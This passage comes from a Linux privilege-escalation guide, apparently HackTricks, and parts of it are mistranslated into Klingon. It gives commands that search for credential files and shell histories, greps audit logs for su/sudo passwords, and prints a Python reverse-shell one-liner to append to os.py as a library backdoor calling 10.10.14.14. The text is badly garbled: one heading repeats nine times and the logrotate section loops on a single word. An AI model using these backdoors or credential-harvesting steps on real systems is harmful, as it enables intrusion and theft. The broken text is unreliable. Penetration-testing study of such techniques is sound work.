### \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

### \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

### \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

### \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

### \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

### \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

### \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

### \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

### \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### qarDaS HaSta

Hidden files are files that are not visible by default in a file manager or command line interface. These files are often used to store sensitive information or configuration settings that should not be easily accessible to regular users.

In Linux, hidden files are denoted by a dot (.) at the beginning of the file name. For example, a hidden file named "secret.txt" would be displayed as ".secret.txt". 

To view hidden files in a file manager, you can usually enable an option to show hidden files. In the command line, you can use the "ls -a" command to display all files, including hidden ones.

Hidden files can be useful for hiding sensitive data, but they can also be used by attackers to hide malicious files or configurations. Therefore, it's important to regularly check for hidden files and ensure that they are not being used for malicious purposes.
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries in PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type -f -executable 2>/dev/null; done
```
### **Qa'Hom Qa'**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Qa'leghpu'**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Known files containing passwords

Read the code of [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), it searches for **several possible files that could contain passwords**.\
**Another interesting tool** that you can use to do so is: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) which is an open source application used to retrieve lots of passwords stored on a local computer for Windows, Linux & Mac.

### Logs

If you can read logs, you may be able to find **interesting/confidential information inside them**. The more strange the log is, the more interesting it will be (probably).\
Also, some "**bad**" configured (backdoored?) **audit logs** may allow you to **record passwords** inside audit logs as explained in this post: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**Shell files** are scripts written in the shell programming language, which is commonly used in Unix-like operating systems. These files have the extension `.sh` and contain a series of commands that can be executed in a sequential manner. Shell files are often used to automate tasks or perform system administration tasks.

### Privilege Escalation Techniques
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

**password** paghDI' **name** teH **content** vItlhutlh, logmeyDaq IPs je emails vItlhutlh, je hashes regexps vItlhutlh.\
vaj **linpeas** [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) vItlhutlh checks vItlhutlh 'oH.

## Writable files

### Python library hijacking

vaj **python script** 'e' vItlhutlh **where** vItlhutlh **can write inside** 'e' vItlhutlh **folder** je vItlhutlh **can modify python libraries**, 'oH, 'ej 'oH **backdoor** 'e' **OS library** je **backdoor** vItlhutlh (vaj python script 'e' vItlhutlh 'oH, os.py library copy je paste).

**backdoor** 'e' library vItlhutlh 'oH, os.py library vItlhutlh **end** vItlhutlh **add** vItlhutlh **line** vItlhutlh (IP je PORT vItlhutlh change):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

**logrotate**-nISmoHta' **logrotate** vulnerability **log** file **log** file **logrotate** **root** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate** **logrotate**
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Note the blank space between Network and /bin/id_)

### **init, init.d, systemd, and rc.d**

The directory `/etc/init.d` is home to **scripts** for System V init (SysVinit), the **classic Linux service management system**. It includes scripts to `start`, `stop`, `restart`, and sometimes `reload` services. These can be executed directly or through symbolic links found in `/etc/rc?.d/`. An alternative path in Redhat systems is `/etc/rc.d/init.d`.

On the other hand, `/etc/init` is associated with **Upstart**, a newer **service management** introduced by Ubuntu, using configuration files for service management tasks. Despite the transition to Upstart, SysVinit scripts are still utilized alongside Upstart configurations due to a compatibility layer in Upstart.

**systemd** emerges as a modern initialization and service manager, offering advanced features such as on-demand daemon starting, automount management, and system state snapshots. It organizes files into `/usr/lib/systemd/` for distribution packages and `/etc/systemd/system/` for administrator modifications, streamlining the system administration process.

## Other Tricks

### NFS Privilege escalation

{% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no\_root\_squash-misconfiguration-pe.md)
{% endcontent-ref %}

### Escaping from restricted Shells

{% content-ref url="escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](escaping-from-limited-bash.md)
{% endcontent-ref %}

### Cisco - vmanage

{% content-ref url="cisco-vmanage.md" %}
[cisco-vmanage.md](cisco-vmanage.md)
{% endcontent-ref %}

## Kernel Security Protections

* [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
* [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket\_static\_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local\_exploit\_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

* [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\
* [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\
* [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\
* [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\
* [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\
* [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\
* [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\
* [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\
* [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
* [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
* [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
* [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
* [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
* [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
* [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
* [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
* [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
